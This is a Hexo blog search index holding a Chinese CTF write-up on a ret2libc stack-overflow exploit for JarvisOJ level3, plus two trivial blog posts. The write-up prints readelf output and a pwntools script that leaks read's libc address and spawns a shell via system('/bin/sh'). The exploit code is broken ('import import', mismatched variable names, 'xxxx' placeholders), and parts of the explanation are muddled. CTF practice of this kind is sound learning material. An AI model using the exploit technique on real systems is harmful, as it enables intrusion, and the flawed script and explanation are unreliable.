<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>最简单的ret2libc</title>
      <link href="/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/"/>
      <url>/2019/07/21/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ret2libc/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>​        对于我来说ret2libc还是比较难懂的一块东西，借着师兄的学习资料，总算对ret2libc有了一点深刻的了解。</p><hr><h3 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h3><p>​        ret2libc这一类的题目一般会给你一个题目文件和一个libc库文件。如libc.so。libc.so里存放的是程序编译的所有函数，而解题的主要思想就是借助libc.so里各个函数之间的相对地址和程序的是相同的这一特性。libc库中的函数和主函数中的函数，其地址的差值就是所谓的offset。如果知道了这个offset和任意libc中的函数A地址，你就知道了A在主函数中的地址。</p><hr><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a ./libc.so | grep &quot;function@&quot;     #在libc.so里查找function函数地址</span><br><span class="line">strings -a -t x ./libc.so | grep &quot;/bin/sh&quot;  #在libc.so里查找字符串”/bin/sh“地址</span><br></pre></td></tr></table></figure><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>​        JarvisOJ中的level3。打开后发现</p><p><img src="C:%5CUsers%5C13953%5CDesktop%5C%E6%8D%95%E8%8E%B7.PNG" alt></p><p>read()是一个明显的栈溢出漏洞函数（gets()，puts()等也是）。</p><p>使用上面提到的工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;system&quot;</span><br><span class="line">   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;read@&quot;</span><br><span class="line">   571: 000dd3e0   125 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.0</span><br><span class="line">   705: 0006f230    50 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.0</span><br><span class="line">   950: 000dd3e0   125 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.0</span><br><span class="line">  1166: 000e30f0  1461 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.0</span><br><span class="line">  1263: 000ee840    46 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7</span><br><span class="line">  1698: 000643a0   259 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.0</span><br><span class="line">  2181: 000c5690   204 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.1</span><br><span class="line">  2300: 000643a0   259 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;write@&quot;</span><br><span class="line">   108: 0006c410   323 FUNC    GLOBAL DEFAULT   12 _IO_wdo_write@@GLIBC_2.2</span><br><span class="line">   182: 000dd460   125 FUNC    WEAK   DEFAULT   12 __write@@GLIBC_2.0</span><br><span class="line">   306: 0012a880    45 FUNC    GLOBAL DEFAULT   12 _IO_do_write@GLIBC_2.0</span><br><span class="line">   307: 0006fcc0    45 FUNC    GLOBAL DEFAULT   12 _IO_do_write@@GLIBC_2.1</span><br><span class="line">  1330: 000c5760   204 FUNC    GLOBAL DEFAULT   12 __libc_pwrite@@GLIBC_PRIVATE</span><br><span class="line">  1677: 000ee870    62 FUNC    GLOBAL DEFAULT   12 eventfd_write@@GLIBC_2.7</span><br><span class="line">  1692: 000647f0   372 FUNC    WEAK   DEFAULT   12 fwrite@@GLIBC_2.0</span><br><span class="line">  2140: 0012a2d0   108 FUNC    GLOBAL DEFAULT   12 _IO_file_write@GLIBC_2.0</span><br><span class="line">  2144: 0006ecf0   131 FUNC    GLOBAL DEFAULT   12 _IO_file_write@@GLIBC_2.1</span><br><span class="line">  2165: 000647f0   372 FUNC    GLOBAL DEFAULT   12 _IO_fwrite@@GLIBC_2.0</span><br><span class="line">  2186: 000c5760   204 FUNC    WEAK   DEFAULT   12 pwrite@@GLIBC_2.1</span><br><span class="line">  2303: 000dd460   125 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf-a libc.so | grep &quot;exit@&quot;</span><br><span class="line">readelf-a：未找到命令</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;exit@&quot;</span><br><span class="line">   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10</span><br><span class="line">   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0</span><br><span class="line">   554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0</span><br><span class="line">   609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0</span><br><span class="line">   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10</span><br><span class="line">   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3</span><br><span class="line">  1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0</span><br><span class="line">  1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0</span><br><span class="line">  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0</span><br><span class="line">  2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ strings -a -t x libc.so |grep &quot;/bin/sh&quot;</span><br><span class="line"> 162d4c /bin/sh</span><br></pre></td></tr></table></figure><hr><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("")</span></span><br><span class="line">p=process(<span class="string">"./level3"</span>)</span><br><span class="line">e=ELF(<span class="string">"./level3"</span>)</span><br><span class="line">plt_write=hex(e.plt[<span class="string">'write'</span>])</span><br><span class="line">got_read=hex(e.got[<span class="string">'read'</span>])</span><br><span class="line">vulneradr=hex(e.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(int(plt_write,<span class="number">16</span>))+p32(int(vulneradr,<span class="number">16</span>))+p32(<span class="number">1</span>)+p32(int(got_read,<span class="number">16</span>))+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">readadr=hex(u32(p.recv(<span class="number">4</span>))<span class="comment">#read's real address</span></span><br><span class="line">print(<span class="string">'readadr='</span>+readar)</span><br><span class="line">libcread=<span class="number">0x000dd3e0</span></span><br><span class="line">offset=int(readadr,<span class="number">16</span>)-libcread<span class="comment">#offset of libc and main</span></span><br><span class="line">sysadr=offset+xxxx</span><br><span class="line">exitadr=offset+xxxx</span><br><span class="line">binshadr=offset+xxxx</span><br><span class="line">paylaod1=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(sysadr)+p32(exitadr)+p32(binshadr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><p>​        我们知道</p><blockquote><p>plt表中存放的got表的地址，got表中存放的是函数的真实地址</p></blockquote><p>​        首先我们得到write的plt表值，read的got表值（got表存放的是read函数的真实地址），以及read函数所在的vulnerable_function的地址。然后我们就开始可以构造第一个payload来泄露read啊函数的真实地址了，前面的是0x88的泄露点和32位的部分，最后三个则是write函数所需的参数，vulenr函数是返回地址，即调用vunler函数和write函数来输出read函数的真实地址。知道了read的真实地址之后我们就可以构造offset了，使用readelf命令读取libc.so文件中的地址。</p><p>​        offset=readadr-libcread（read函数的真实地址-read函数的libc地址）</p><blockquote><p>offset = real_function_addr - libc_function_addr</p></blockquote><p>最后根据offset和各函数的地址就可以做出来了，”bin/sh”的地址可以用strings的命令得到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次搭建博客</title>
      <link href="/2019/07/17/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/07/17/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>第一次搭建博客</p><p>有点简陋但是是自己一步一步摸索出来的</p><p>加油啊 !</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/07/17/hello-world/"/>
      <url>/2019/07/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="put-the-local-files-on-the-Github"><a href="#put-the-local-files-on-the-Github" class="headerlink" title="put the local files on the Github"></a>put the local files on the Github</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure><p>More info:None</p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="生成dexo"><a href="#生成dexo" class="headerlink" title="生成dexo"></a>生成dexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate <span class="comment"># or hexo g</span></span><br></pre></td></tr></table></figure><h3 id="部署dexo"><a href="#部署dexo" class="headerlink" title="部署dexo"></a>部署dexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy <span class="comment"># or hexo d</span></span><br></pre></td></tr></table></figure><p>More info:None</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
